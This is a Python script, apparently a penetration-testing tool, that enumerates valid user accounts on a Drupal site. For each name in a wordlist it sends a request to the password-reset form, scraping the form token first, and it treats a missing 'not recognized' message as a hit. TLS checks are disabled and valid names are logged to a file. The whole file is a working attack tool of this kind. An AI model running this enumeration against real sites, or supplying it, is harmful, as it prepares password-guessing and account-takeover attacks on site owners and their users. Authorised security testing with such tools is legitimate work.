#!/usr/bin/env python3
import requests
import re
import sys
import argparse
import os.path
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = argparse.ArgumentParser()
parser.add_argument('--target', nargs='?', help='specifies the target (example: https://192.168.1.100)')
parser.add_argument('--list', nargs='?', help='specifies the wordlist file containing a list of usernames to try')
parser.add_argument('--quiet', action='store_true', help='only output valid usernames, not all attempts')

#Verifying Legitimacy of options.
args=parser.parse_args()
if not args.list or not args.target:
    exit(parser.print_help())
if not os.path.isfile(args.list):
    print("The wordlist %s could not be found." %args.list)
    exit()
try:
    checkIfUp = requests.get(url = '%s/?q=user/password' %args.target, verify = False)
except:
    print("Error reaching target. Please ensure you specified the correct URL. Did you forget to add http/https to the target string?")
    exit()


#Make is pretty
C_RESET = '\033[0m'
C_RED_B = '\033[1;31m'
C_GREEN_B = '\033[1;32m'

target = "%s/?q=user/password" %args.target
nameFile = args.list

nameFileOpen = open(nameFile,"r")
nameList = nameFileOpen.readlines()
nameFileOpen.close()
try:
    for name in nameList:
        user = name[0:-1]
        drupalRequests = requests.Session()
        getFormID = drupalRequests.get(url = target, verify = False)
        formBuildID = re.findall("""name="form_build_id" value=".*" """, getFormID.text)[0].split('"')[3]
        params = {  'name': user,
            'form_build_id': formBuildID,
            'form_id': "user_pass",
            'op': "E-mail+new+password"
            }
        sendPost = drupalRequests.post(url = target, data = params, verify = False)
        invalidUserString = re.findall("is not recognized as a user name", sendPost.text)
        if invalidUserString:
            if not args.quiet:
                print("%s%s Invalid.%s" %(C_RED_B, user, C_RESET))
        else:
            print("%s%s Valid.%s" %(C_GREEN_B, user, C_RESET))
            logResults = open("drupal_userenum.log", "a")
            logResults.write(name + "\n")
            logResults.close()

except KeyboardInterrupt:
    print("Gracefully Exiting . . .")
    exit()

